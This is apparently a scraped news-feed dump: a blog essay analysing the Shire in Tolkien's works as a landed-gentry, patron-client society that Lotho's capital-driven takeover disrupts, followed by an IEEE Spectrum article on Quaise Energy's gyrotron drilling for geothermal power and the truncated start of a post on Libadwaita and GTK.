<p>The only other office of note was the Mayor of Michel Delving, elected every seven years at the Free Fair at Midsummer. The Mayor’s only real task was to preside over banquets, but by tradition and custom, he also held the posts of Postmaster and First Sheriff, thus controlling the only two governmental organs of note, the Messenger Service and the Watch. The former does exactly what you’d expect, the latter was the closest thing the Shire had to a police force, though it was a fully-volunteer outfit whose main tasks were rounding up stray livestock and discouraging “outsiders” from entering the Shire.</p>



<p>We can conclude from this, right away, that yes, the Shire likely had few, if any taxes. Individual taxation requires a large administrative apparatus to collect, and large numbers of full-time bureaucrats, which is why it was so rare in Medieval Europe. (This is the irony of George R.R. Martin’s famous <a href="https://www.tolkiensociety.org/2014/04/grrm-asks-what-was-aragorns-tax-policy/" target="_blank" rel="noreferrer noopener">complaint</a> of “what was Aragorn’s tax policy?” He probably didn’t have one, and depended on feudal vassals to administer his holdings.) The minimal government of the Shire would likely have been funded out of bridge and road tolls, tariffs, and/or theoretically-voluntary gifts from elite families, a common custom in Ancient Mediterranean democracies such as Athens. </p>



<p>But what does this tell us about the broader social and economic structures of Hobbit society? The implication in both books and movies is that most Hobbits spent their time either farming or enjoying leisure time, but this makes little sense, when one considers what we know about premodern agriculture and what little of life and culture in the Shire. This could describe a pure <a href="https://en.wikipedia.org/wiki/Subsistence_agriculture" target="_blank" rel="noreferrer noopener">subsistence</a> economy, based around producing just enough food to ensure survival, and some of the text seems to suggest that, but it’s clear that that can’t be true. The Shire has a well-developed economy, with mills, full-time craftsmen, inns, and the large-scale cultivation of luxury crops, despite having almost no foreign trade (Southfarthing pipe-weed being found as far away as Isengard is taken as proof of Saruman’s meddling) or industry. Premodern agriculture was characterized primarily as being low-surplus and high-labor, it takes a <em>lot </em>of people a <em>lot </em>of time to produce enough food for everyone to eat, and there’s rarely much left over. How does this jibe with the leisurely lives of simple pleasure that our Hobbit heroes seem to enjoy? </p>



<p>There’s actually a very obvious answer, which is that our protagonists aren’t typical Hobbits. Bilbo, Frodo, Merry, and Pippin are all very clearly members of the landed gentry, the landowning class that controls most means of economic production and maintains social dominance over the Shire. This isn’t really extrapolation or interpretation, it’s more-or-less text, and I suspect the only reason it’s not spelled out is because Tolkien assumed any reader would understand that intuitively. Bilbo and Frodo are both gentlemen of leisure because the Baggins family is independently wealthy, and that wealth almost <em>has </em>to come from land ownership, because there isn’t enough industry or trade to sustain it. They can afford to go on adventures and study Elven poetry because they draw their income from tenant farmers renting their land. Merry and Pippin are from an even higher social tier; both are the heirs to powerful families that hold quasi-feudal offices (the Master of Buckland, for the Brandybucks, and the Thain, for the Tooks). </p>


<div>
<figure><img data-attachment-id="11922" data-permalink="https://nathangoldwag.wordpress.com/2024/05/31/the-moral-economy-of-the-shire/shire/" data-orig-file="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/shire.webp" data-orig-size="1920,800" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="shire" data-image-description="" data-image-caption="" data-medium-file="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/shire.webp?w=300" data-large-file="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/shire.webp?w=676" width="1024" height="426" src="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/shire.webp?w=1024" alt=""><figcaption><sub>It’s kinda weird that there aren’t any crops</sub></figcaption></figure></div>


<p>As I said before, this is the traditional system of social organization in the English countryside, sometimes known as “squirearchy”. The gentry, in this paradigm, aren’t nobility–they don’t have a distinct set of legal privileges. Serfdom, or other forms of labor bound to the land, doesn’t seem to exist, and there’s no evidence of military vassalage as an organizing principle. Instead, we can see that a relatively small number of families owns much of the land, and much of the agricultural capital–mills, granaries, oxen, plows, etc–allowing them to wield a high level of informal economic and social control over their community. Most other Hobbits would either be tenant farmers, paying most of their produce back to their landlords in rents, or yeomen, independent small farmers who owned their own land, but were still dependent on the gentry in many respects. We can see a small, burgeoning urban bourgeois emerging in the small towns and villages, perhaps, but without foreign trade or industrialization, this can’t grow to challenge the gentry, and no proletariat is likely to exist yet.</p>



<p>Understanding this sheds a great deal of light on Tolkien’s explanation of the Shire’s governance. The lack of much organized administration is not, as some suggest, a form of <a href="https://www.reddit.com/r/Anarchy101/comments/aedzwn/is_the_shire_an_anarchist_community/" target="_blank" rel="noreferrer noopener">democratic anarchism</a>, but instead the result of elite control. </p>



<blockquote>
<p>All Hobbits were, in any case, clannish and reckoned up their relationships with great care. They drew long and elaborate family-trees with innumerable branches. </p>



<p>—</p>



<p>The Thainship had ceased to be more than a nominal dignity. The Took family was still, indeed, accorded a special respect, for it remained both numerous and exceedingly wealthy.</p>
<cite>The Fellowship of the Ring, J.R.R. Tolkien, pgs. 7, 9</cite></blockquote>



<p>This is a society organized around family and clan dynamics, where power flows not from the office, but from who you know, and the web of favors, debts, and relationships you can call upon. The Tooks are not powerful because they hold the Thainship, they hold the Thainship as a signifier of being “the first family” of the Shire, in terms of wealth and influence. The Mayor of Michel Delving’s main job is to preside over banquets because, in a political structure like this, those sort of social events are where everything is actually decided and established, in the subtle, informal relationships between the families who own everything. There’s no bureaucracy or administrative apparatus because there is no <em>need </em>for one. The Shire is not conducting war or diplomacy or trade, and isn’t administering large populations of subjects, and there would be no reason for the Oldbucks, Brandybucks, Tooks, etc to support the kind of centralization of state power that could challenge their informal reign. </p>



<p>From everything we’re told, the Shire is a very agriculturally productive region, which helps explain the lack of debt-peonage or other forms of unfree labor. It also explains the relative “looseness” of the system we’re looking at here; the gap between the lower gentry and upper yeomanry isn’t very large, and most families are able to support themselves with only minimal assistance.  </p>



<p>The other term we need to know if we want to understand the Shire is “clientelism”, perhaps more commonly refereed to as “patron-client relationships”. This is a social-political structure that emerges organically in many different contexts, and consists of a set of mutual, hierarchical obligations between powerful “patrons” and a network of “clients” who depend on them, economically, socially, or politically. It seems likely, from what we see of the Shire, that clientelism is the main organizing force within Hobbit politics. This would be far from unusual, in this sort of system. </p>



<blockquote>
<p>But because our small subsistence farmers are mostly focused on controlling and mitigating risk rather than enhancing raw yields, often the most important thing they could get from the large landholder was not a tangible thing at all: <strong>access to vertical patronage ties</strong>. Just like the smallholders could establish horizontal ties with fellow small farmers, they could also try to establish those ties with the big fellow in the big house. Of course the mechanisms for establishing the ties were different: few peasants could banquet an aristocrat and most aristocrats would be insulted by a suggestion of an alliance through marriage. Instead the ties were strictly vertical – that is they were unequal. They often began with the farmer working at least a bit as a tenant on the big farm, but also typically included political support, sometimes military support (that is, coming out to fight when the large landholder did, often as common troops in his retinue) and no small amount of social deference.</p>
<cite><em>Collections: Bread, How Did They Make It? Part II: Big Farms</em>, Brett Devereaux (<a href="https://acoup.blog/2020/07/31/collections-bread-how-did-they-make-it-part-ii-big-farms/" target="_blank" rel="noreferrer noopener">Source</a>)</cite></blockquote>



<p>To understand this, let’s look at a prototypical example of this; the relationship between the Baggins and the Gamgees.</p>



<p>Both Samwise Gamgee and his father, Hamfast Gamgee, are employed by Bilbo and Frodo Baggins, but the relationship is clearly far deeper than that. Throughout <em>Lord of the Rings</em>, Frodo treats Sam almost a feudal retainer, not just a person in a employee relationship, but someone who owes personal fealty to him, an attitude clearly reciprocated by Sam. There’s affection, friendship, and even love between them, but in the context of a hierarchical relationship. It’s never in question who “Mister Frodo” is, though it’s clear that this loyalty comes with expectations and obligations. Sam is not a slave, not is he bound by oaths of vassalage, or contract. He is loyal because he is expected to be, and because the Baggins repay loyalty with patronage, both to him, and his family.</p>



<blockquote>
<p>The poorer Hobbits, and especially those of Bagshot Row, did very well. Old Gaffer Gamgee got two sacks of potatoes, a new spade, a woolen waistcoat, and a bottle of ointment for creaking joints. </p>



<p>—</p>



<p>“Well, you can’t say fairer than that,” said the gaffer. “Mr. <em>Frodo </em>Baggins is a real gentlehobbit, I always have said, whatever you may think of some others of the name, begging your pardon. And I hope my Sam’s behaved hisself and given satisfaction?”</p>
<cite>The Fellowship of the Rings, J.R.R. Tolkien, pg. 37<p>The Return of the King, J.R.R. Tolkien, pg. 991 </p></cite></blockquote>



<p>The Gamgees are likely tenants of the Baggins, or at least dependent on them for access to agricultural capital. They likely send much of their income up to Bag End in rent, and provide services, as gardeners, batmen, valets, traveling companions, etc. They also provide support, in a social and civic sense, as we see. If Frodo had gone to the Free Fair to run for Mayor, the Gamgees and other tenants would have voted for him, and would have accompanied him in public, to demonstrate his status and prestige. But in return for this, they could expect generous gifts on holidays, loans of money on favorable terms, lax enforcement of rental arrears in time of drought and famine, and legal support in disputes. </p>



<p>Tolkien himself said that Sam was inspired by his experience as a young Lieutenant in the Lancashire Fusiliers in WWI. </p>



<blockquote>
<p>My Sam Gamgee is indeed a reflexion of the English soldier, of the privates and batmen I knew in the 1914 war, and recognized as so far superior to myself</p>
<cite>J.R.R. Tolkien: A Biography, ed. Humphrey Carpenter, pg. 89</cite></blockquote>



<p>This, however, should not surprise us. Tolkien was serving in the British Army, and armies are always embryonic reflections of the societies that raised them. </p>



<p>For bachelors Bilbo and Frodo, these were personal, individual relationships. But the norm was likely closer to webs of debts, favors, and obligations, traded back and forth between families, cemented by marriage alliances and social ties. We’re told repeatedly that gift-giving and hosting feasts are two of the primary preoccupations of Hobbits. To modern ears, this may come across as utopian, or idyllic, but these sorts of status displays were a key part of many economic and social systems. In many Pacific Northwest Native American tribes, this was known as “<a href="https://en.wikipedia.org/wiki/Potlatch" target="_blank" rel="noreferrer noopener">potlatch</a>“, and served as both a political and economic system, in which conspicuous displays of generosity were used to denote power and prestige. The Shire clearly has a monetary economy, but gift-giving remains important. The entire first chapter of <em>Lord of the Rings</em> is devoted to Bilbo’s 111st birthday party, which is a huge event that attracts intense attention from across Hobbit society, and involves massive displays of largess, solidifying the Baggins’ social position, and cementing ties with neighboring families and rival clans. Or at least, it <em>would </em>have been, if Bilbo hadn’t had an ulterior motive.  </p>



<p>I think all of this is pretty reasonable extrapolation from the text. Tolkien was decidedly <em>not </em>writing direct allegories, but he made no secret of the fact that he was drawing upon his substantial academic knowledge of premodern history and society to shape his world. That’s a big part of why it <a href="https://acoup.blog/2022/12/16/collections-why-rings-of-powers-middle-earth-feels-flat/" target="_blank" rel="noreferrer noopener">works so well</a>. But what I find fascinating about this topic is the way in which <em>Lord of the Rings</em> doesn’t just depict the traditional agricultural political economy, but the way in which it demonstrates what happened to it.  </p>



<p>The title of this post is taken from the 1976 book <em>The Moral Economy of the Peasant: Rebellion and Subsistence in Southeast Asia</em>, by James C. Scott, which I read in undergrad. The book analyzes a series of peasant insurrections in Indochina and Burma in the 1930s, and argues that their root causes was the disruption of traditional sociopolitical and cultural norms, the so-called “<a href="https://en.wikipedia.org/wiki/Moral_economy" target="_blank" rel="noreferrer noopener">moral economy</a>” by colonialism and market capitalism. Of key importance was his contention that the <em>casus belli </em>was not only, or even primarily, increased exploitation in a purely material sense, but the disruption to traditional patronage networks that had sustained them for generations. Peasant households should not be seen as small businesses, trying to maximize their annual profits, but as <em>people trying to survive</em>. A single failed harvest could mean death, and in this situation, the patronage networks were a vital social safety net. A peasant in this system gave most of his income to his landlord, without fail, but he could trust that in case of disaster, he would have some recourse.</p>


<div>
<figure><img data-attachment-id="11921" data-permalink="https://nathangoldwag.wordpress.com/2024/05/31/the-moral-economy-of-the-shire/61mnvd8rull-_ac_uf10001000_ql80_/" data-orig-file="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/61mnvd8rull._ac_uf10001000_ql80_.jpg" data-orig-size="637,1000" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="61mnvd8rull._ac_uf10001000_ql80_" data-image-description="" data-image-caption="" data-medium-file="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/61mnvd8rull._ac_uf10001000_ql80_.jpg?w=191" data-large-file="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/61mnvd8rull._ac_uf10001000_ql80_.jpg?w=637" width="637" height="1000" src="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/61mnvd8rull._ac_uf10001000_ql80_.jpg?w=637" alt=""><figcaption>     </figcaption></figure></div>


<p>More modern market economics brought opportunity–but also risk. As landowners became integrated into the globalized economy, backed up the military might of colonial regimes, they had less and less reason to uphold the traditional bargains with their tenants and smallholders. Plantation-style cultivation of cash crops for market could produce riches, but also catastrophe in the case of drought, famine, or economic downturn–all of which occurred <a href="https://en.wikipedia.org/wiki/Ngh%E1%BB%87-T%C4%A9nh_Soviets" target="_blank" rel="noreferrer noopener">in Vietnam</a> in the 1930s. Traditional elites in Indochina had often been lenient regarding peasants, because they had to be, unable to strictly enforce taxation or rent in times of scarcity, and dependent for social and political support on their clients. That was not the case for French authorities in Saigon and Hanoi. On the very first page, Scott describes “the position of the rural population” as “that of a man standing permanently up to his neck in water, so that even a ripple might drown him.” (<em>Moral Economy</em>, pg. vii). The perhaps counterintuitive conclusion is that peasants are often quite conservative. They’ll fight to support the social order, if they think it’s in their interests, and are often quite wary of change. The arrival of deracinated capitalism could be quite advantageous, in the long run, but in the short run could destroy communities that had found a rough balance of survival.</p>



<p>Another famous example of this is the <a href="https://en.wikipedia.org/wiki/German_Peasants%27_War" target="_blank" rel="noreferrer noopener">Great Peasants’ War</a> of 1524-1525, in the Holy Roman Empire. Reading the <a href="https://www.marxists.org/archive/marx/works/1850/peasant-war-germany/ch0e.htm" target="_blank" rel="noreferrer noopener">Twelve Articles</a>, one of the lists of grievances drawn up by Swabian peasant leaders, it is noteworthy how they are couched in a language of conservatism and tradition, demanding the restoration of ancient privileges, justified in religious language. Of the demands, Four, Five, and Ten are in regards to traditional feudal privileges that were being eroded, rights of fishing, hunting, gathering wood, etc. Six, Seven, and Eight are demanding regulation of the customary labor provided by peasants to their lords, insisting on lower rents and quotas. I don’t think anyone would argue that European farmers in Germany <em>today </em>aren’t better off now than they were in the 1500s. But the period of economic transition could be brutal.</p>



<p>This process of consolidation and commercialization undermining traditional social arrangements can be seen in the Shire, mostly in the last few chapters of <em>The Return of the King</em>, when our heroes return from abroad. </p>



<blockquote>
<p>“It all began with Pimple, as we call him,” said Farmer Cotton; “and it began as soon as you’d gone off, Mr. Frodo. He’d funny ideas, had Pimple. Seems he wanted to own everything himself, and then order other folks about. It soon came out that he already did own a sight more than was good for him; and he was always grabbing more, though where he got the money was a mystery: mills and malt-houses and inns, and farms, and leaf-plantations………of course, he started with a lot of property in the Southfarthing which he had from his dad; and it seems he’d been selling a lot o’ the best leaf, and sending it away quietly for a year or two. But at the end o’ last year he began sending away loads of stuff, not only leaf. Things began to get short, and winter coming on, too. Folk got angry, but he had his answear. A lot of Men, ruffians mostly, came with great waggons, some to carry off the goods south-away, and others to stay. And more came.”</p>
<cite>The Return of the King, J.R.R. Tolkien, pg. 989 </cite></blockquote>



<p>Lotho Sackville-Baggins was a member of the Shire’s gentry, and it seems a relatively powerful one. He made contact with <a href="https://lotr.fandom.com/wiki/Saruman" target="_blank" rel="noreferrer noopener">Saruman</a>–we’re never told how–and thus gained access to a source of capital outside the traditional Hobbit system via foreign trade, which allowed him to accumulate enough economic control to emerge as <em>de facto</em> ruler, bringing in foreign mercenaries to suppress local resistance and beat down his competitors. In Tolkien’s writing, Sauron and Saruman represent the forces of modernity, tearing down tradition and continuity, and this is just yet another example of that, the social order being corrupted by money and power, undermining the Way Things Should Be. It is no coincidence that the counter-revolution is led by Frodo, Pippin, and Merry–scions of some of the leading families of the gentry–or that Lotho’s main opposition came from that same establishment. </p>



<blockquote>
<p>“You see, your dad, Mr. Peregrin, he’s never had no truck with this Lotho, not from the begining: said that if anyone was going to play the chief at this time of day, it would be the rightful Thain of the Shire and no upstart. And when Lotho sent his Men they got no change out of him. Tooks are lucky, they’ve got those deep holes in the Green Hills, the Great Smials and all, and the ruffians can’t come at ’em; and they won’t let the ruffians come on their land. If they do, Tooks hunt ’em. Tooks shot three for prowling and robbing. After that the ruffians turned nastier. And they keep a pretty close watch on Tookland. No one gets in nor out of it now.” </p>
<cite>The Return of the King, J.R.R. Tolkien, pg. 986 </cite></blockquote>



<p>Of course, one of the primary themes of <em>Lord of the Rings</em> is the inevitability of change. The forces of darkness may be defeated, but the power of the Three Elven Rings are broken too, and the beauty of the Old World fades away. All we can do is fight to preserve what we can. And thus, though Lotho’s plot to establish an oligarchic dictatorship in the Shire is defeated, things will never go back to the way they were before the War of the Ring. </p>



<p>One of the interesting developments that can be seen, if you read the Appendices closely, is that Samwise Gamgee ends up basically running the Shire. After Frodo departs for the Undying Lands, he inherits Bag End, and presumably the wealth and prestige of the Baggins family. In FO 6, he is elected Mayor of Michel Delving, and serves seven consecutive seven-year terms. He has thirteen children, and is the founder of a new family line, the Gardeners. His daughter Elanor serves as a maid to Queen Arwen of the Reunited Kingdom of Gondor and Arnor, cementing his connection to the royal court, and her husband Fastred Fairbairn was made hereditary Warden of the Westmarch. His daughter Goldilocks married Faramir Took, the son-and-heir of Pippin Took, and the thirty-third Thane of the Shire. We aren’t told many details about the rest of his children, but it’s clear that the Gardiner family is in a position of unparalleled influence and power.</p>



<p>So, what does this all mean? There is an unfortunate tendency for these sorts of essays to be framed as <em>REVEALING THE SURPRISINGLY DARK HIDDEN REALITY OF THE SHIRE</em> or whatever, which is not the point I’m trying to make. When I write about the economics and politics of fictional worlds, it is usually because we, consciously or otherwise, base much of our understanding of the real world off of our perceptions of them. I think Tolkien was very aware of the sort of society he was depicting in the Shire, and that he was describing an idealized, imaginary version of it that never quite worked as well as one would hope. </p>



<p>There’s nothing wrong with that, but one of the consequences of modern life is that we’re so alienated from our subsistence systems that we’ve ceased to understand them. The idea that farming is <a href="https://knowyourmeme.com/memes/anarchist-supply-chains" target="_blank" rel="noreferrer noopener">easy</a> or <a href="https://www.reddit.com/r/Anticonsumption/comments/192kcvf/food_is_free/" target="_blank" rel="noreferrer noopener">effortless</a>, or that food is <a href="https://nathangoldwag.wordpress.com/wp-content/uploads/2024/05/gjprq5axuaacabt.png" target="_blank" rel="noreferrer noopener">only scarce</a> because of modern capitalism, or that peasants “<a href="https://www.adamsmith.org/blog/regulation-industry/medieval-peasants-really-did-not-work-only-150-days-a-year" target="_blank" rel="noreferrer noopener">had it easy</a>” compared to office workers, is disturbingly common. We see a petty aristocrat like Frodo Baggins, and don’t see all the labor that goes into sustaining his lifestyle. We see a successful peasant family like the Gamgees, and don’t see all the tradeoffs and compromises necessary to scrape out a living. We see the hierarchies of traditional rural society, and because it’s alien and exotic, we see it as natural and idyllic, instead of merely a different system for organizing labor and wealth. </p>



<p>Tolkien liked to describe Middle-earth as a mythical lost past of our own Earth, and though that doesn’t <em>really </em>make any sense, it’s true he constructed his fictional universe from pieces of our own. That’s why I think this sort of analysis can be useful. By learning how the Shire worked, we can start to understand how our own past worked, in all its complexity and contradictions. </p>



<p>I think that’s important. </p>


			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Fusion tech finds geothermal energy application (142 pts)]]></title>
            <link>https://spectrum.ieee.org/geothermal-energy-gyrotron-quaise</link>
            <guid>40565983</guid>
            <pubDate>Mon, 03 Jun 2024 18:46:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://spectrum.ieee.org/geothermal-energy-gyrotron-quaise">https://spectrum.ieee.org/geothermal-energy-gyrotron-quaise</a>, See on <a href="https://news.ycombinator.com/item?id=40565983">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-headline="Fusion Tech Finds Geothermal Energy Application"><p>The upper 10 kilometers of the Earth’s crust contains <a href="https://www.energy.gov/eere/geothermal/geothermal-faqs" target="_blank">vast geothermal reserves</a>, essentially awaiting human energy consumption to <a href="https://education.nationalgeographic.org/resource/geothermal-energy/" target="_blank">begin to tap into</a> its <a href="https://www.nature.com/articles/s41598-024-53738-1" target="_blank">unstinting power output</a>—which itself yields no greenhouse gasses. And yet, geothermal sources currently produce only <a href="https://en.wikipedia.org/wiki/Geothermal_power#Utility-grade_stations" target="_blank">three-tenths of one percent</a> of the world’s electricity. This promising energy source has long been limited by the extraordinary challenges of drilling holes that are deep enough to access the intense heat below the Earth’s surface.</p><p>Now, an MIT spin-off says it has found a solution in an innovative technology that could dramatically reduce the costs and timelines of drilling to fantastic depths. <a href="https://www.quaise.energy/" target="_blank">Quaise Energy</a>, based in Cambridge, Mass., plans to deploy what are called gyrotron drills to vaporize rock using powerful microwaves.<br></p><p>“We need to go deeper and hotter to make geothermal energy viable outside of places like Iceland.” <strong>—Carlos Araque, Quaise Energy</strong></p><p>A <a href="https://en.wikipedia.org/wiki/Gyrotron" target="_blank">gyrotron</a> uses high-power, linear-beam <a data-linked-post="2650273501" href="https://spectrum.ieee.org/the-quest-for-the-ultimate-vacuum-tube" target="_blank">vacuum tubes</a> to generate millimeter-length electromagnetic waves. <a href="https://ui.adsabs.harvard.edu/abs/2014JIMTW..35..325N/abstract" target="_blank">Invented by Soviet scientists in the 1960s</a>, gyrotrons are used in nuclear fusion research experiments to <a href="https://kyotofusioneering.com/en/news/2023/09/04/1803" target="_blank">heat and control plasma</a>. Quaise has <a href="https://financialpost.com/pmn/business-wire-news-releases-pmn/quaise-energy-raises-21-million-to-accelerate-terawatt-scale-deep-geothermal-energy" target="_blank">raised $95 million from investors</a>, including Japan’s Mitsubishi, to develop technology that would enable it to quickly and efficiently drill up to 20 km deep, closer to the Earth’s core than ever before.</p><p><img id="8fc39" data-rm-shortcode-id="94a8d483331a8a75d04b101538544f12" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/photo-of-metal-cylindrical-chamber-with-pipes-and-hoses-and-dials-attached.jpg?id=52269952&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/photo-of-metal-cylindrical-chamber-with-pipes-and-hoses-and-dials-attached.jpg?id=52269952&amp;width=980" width="2000" height="1500" alt=" photo of metal cylindrical chamber with pipes and hoses and dials attached"><small placeholder="Add Photo Caption...">Quaise Energy has developed a prototype portable gyrotron system, which they plan to be conducting field tests with later this year.</small><small placeholder="Add Photo Credit...">Quaise Energy</small></p><p>“Supercritical geothermal power has the potential to replace fossil fuels and finally give us a pathway to an energy transition to carbon-free, baseload energy,” says Quaise CEO <a href="https://www.quaise.energy/company" rel="noopener noreferrer" target="_blank">Carlos Araque</a>, a veteran of the oil and gas industry and former technical director of <a href="https://engine.xyz/" rel="noopener noreferrer" target="_blank">The Engine Accelerator</a>, MIT’s platform to commercialize world-changing technologies. “We need to go deeper and hotter to make geothermal energy viable outside of places like Iceland.”</p><p>The deepest man-made hole, which extends 12,262 meters below the surface of Siberia, took <a href="https://www.scientificamerican.com/article/how-deep-is-the-deepest-hole-in-the-world/" target="_blank">nearly 20 years to drill</a>. As the shaft went deeper, progress declined to less than a meter per hour—a rate that finally decreased to zero as the <a href="https://www.bbc.com/future/article/20190503-the-deepest-hole-we-have-ever-dug" target="_blank">work was abandoned in 1992.</a> That attempt and similar projects have made it clear that conventional drills are no match for the high temperatures and pressures deep in the Earth’s crust.</p><h3>Microwaves meet rocks<br></h3><p>“But an energy beam doesn’t have those kinds of limits,” says <a href="https://www.psfc.mit.edu/people/senior-scientists/paul-p-woskov" target="_blank">Paul Woskov</a>, senior research engineer at MIT’s <a href="https://www.psfc.mit.edu/" target="_blank">Plasma Science and Fusion Center</a>. Woskov spent decades working with powerful microwave beams, steering them into precise locations to heat hydrogen fuel above 100 million degrees to initiate fusion reactions.<br></p><p>“It wasn’t much of a jump to make the connection that if we can melt steel chambers and vaporize them, we could melt rocks.” <strong>—Paul Woskov, MIT</strong></p><p>“I was already aware that these sources were quite damaging to materials because one of the challenges is not to melt the inner chamber of a tokamak,” a device that confines a plasma using magnetic fields. “So it wasn’t much of a jump to make the connection that if we can melt steel chambers and vaporize them, we could melt rocks.”<br></p><p>In 2008, Woskov began intensively studying whether the approach could be an affordable improvement on mechanical drilling. The research led to hands-on experiments in which Woskov used a <a href="https://news.mit.edu/2016/paul-woskov-explores-new-path-through-earth-crust-0412" target="_blank">small gyrotron to blast through bricks of basalt</a>.<br></p><p>Based on his experiments and other research, Woskov calculated that a millimeter-wave source targeted through a roughly 20 centimeter waveguide could blast a basketball-size hole into rock at a rate of 20 meters per hour. At that rate, 25-and-a-half days of continuous drilling would create the world’s deepest hole.<br></p><p>“It was evident that if we could get it to work, we could drill very deep holes for a very small fraction of what it costs now,” says Wostov. Although Woskov is credited as a founder of Quaise, he says he has no financial stake in the company—unlike MIT.<br></p><h3>A wave of possibilities<br></h3><p>The Quaise design calls for a corrugated metal tube to serve as a waveguide, which would be extracted after drilling is completed. The system would rely on injected gas to quench and carry out ash.</p><p>“Instead of pumping fluid and turning a drill, we’ll be burning and vaporizing rock and extracting gas, which is much easier to pump than mud.” <strong>—Carlos Araque, Quaise Energy</strong></p><p>“We will need about a megawatt to power it, the same amount of energy as a typical drilling rig,” says Araque. ”But we’ll be using it in very different ways. Instead of pumping fluid and turning a drill, we’ll be burning and vaporizing rock and extracting gas, which is much easier to pump than mud.”<br></p><p>Using the waveguide to direct energy to the targeted rock allows the energy source to stay on the surface. That may sound like a stretch, but the concept was tested in a <a href="https://archive.org/details/bstj56-10-1825/mode/1up" target="_blank">1970s experiment</a> in which Bell Labs built a <a href="https://nickvsnetworking.com/mmwave-5g-in-the-1960s/" target="_blank">14 km waveguide transmission medium</a> in northern New Jersey. The researchers found that it could transmit millimeter waves with <a href="http://www.boblucky.com/Papers/leadership.htm" target="_blank">very little attenuation</a>.</p><p>Quaise intends to first target industrial customers with a need for steam at a guaranteed flow rate, temperature, and pressure. “Our goal is to match the specs of an industrial load,” says Araque. “They can retire the boiler, and we’ll give them 500º C steam on-site.”</p><p>Eventually, the company hopes the technology could enable new geothermal electric plants, or allow turbines formerly heated by fossil fuels to be repurposed—supplying the grid with an estimated 25-50 megawatts of electricity from each well.</p><p>The company plans to begin field demonstrations this autumn, using a prototype device to drill holes in hard rock at a site in <a href="https://en.wikipedia.org/wiki/Marble_Falls,_Texas" target="_blank">Marble Falls, Tex</a>. From there, Quaise plans to build a full-size demonstration rig in a high-geothermal zone in the western United States.</p><p><img id="30faf" data-rm-shortcode-id="e7ed45f6f4b79c45944298a4d525aa1d" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/image-of-a-rock-surface-with-a-melted-hole-in-the-middle-that-appears-to-extend-deep-into-the-rock-surface.jpg?id=51875667&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/image-of-a-rock-surface-with-a-melted-hole-in-the-middle-that-appears-to-extend-deep-into-the-rock-surface.jpg?id=51875667&amp;width=980" width="3024" height="2451" alt="Image of a rock surface with a melted hole in the middle that appears to extend deep into the rock surface"><small data-gramm="false" data-lt-tmp-id="lt-606527" placeholder="Add Photo Caption..." spellcheck="false">Quaise Energy drilled a hole 254 centimeters (100 inches) deep with a 2.5 cm diameter into a column of basalt, making it 100 times the depth of the team’s original tests, as conducted at MIT.</small><small data-gramm="false" data-lt-tmp-id="lt-146495" placeholder="Add Photo Credit..." spellcheck="false">Quaise Energy</small></p><h3>Facing the depths<br></h3><p>Although laboratory data have demonstrated the feasibility of scaling up the approach, the technical obstacles to the Quaise plan are likely to run deeper than its radical drilling method.</p><p>“If they can actually drill a 10 km hole using high-powered microwaves, that will be a significant engineering achievement,” says <a href="https://www.cheme.cornell.edu/faculty-directory/jefferson-w-tester" target="_blank">Jefferson Tester</a>, who studies geothermal energy extraction in subsurface rock reservoirs at Cornell University. “But the challenge is completing those wells so they don’t fall apart, particularly if you’re going to start removing fluids from underground and changing the temperature profile.</p><p>“Drilling a hole is challenging enough,” says Tester. “But actually running the reservoir and getting the energy out of the ground safely may be something very, very far off in the future.”</p><p><em>This article appears in the June 2024 print issue as “Geothermal Company Taps Into Old Fusion Tech.”</em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Libadwaita: Splitting GTK and Design Language (111 pts)]]></title>
            <link>https://tesk.page/2024/06/03/libadwaita-splitting-gtk-and-design-language/</link>
            <guid>40565357</guid>
            <pubDate>Mon, 03 Jun 2024 17:59:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tesk.page/2024/06/03/libadwaita-splitting-gtk-and-design-language/">https://tesk.page/2024/06/03/libadwaita-splitting-gtk-and-design-language/</a>, See on <a href="https://news.ycombinator.com/item?id=40565357">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  <article id="main">
    <header>
      
    </header>

    

    
      
      <section data-class="card">
          <details>
            <summary aria-label="Table of Contents"><strong>Table of Contents</strong></summary>
            <nav aria-label="Table of Contents">
              <ol id="toc">
<li><a href="#introduction">Introduction</a></li>
<li><a href="#what-is-gtk">What Is GTK?</a></li>
<li>
<a href="#unnecessary-unification-of-the-toolkit-and-design-language">Unnecessary Unification of the Toolkit and Design Language</a>
<ol>
<li><a href="#clash-of-philosophies">Clash of Philosophies</a></li>
<li><a href="#inefficient-diversion-of-resources">Inefficient Diversion of Resources</a></li>
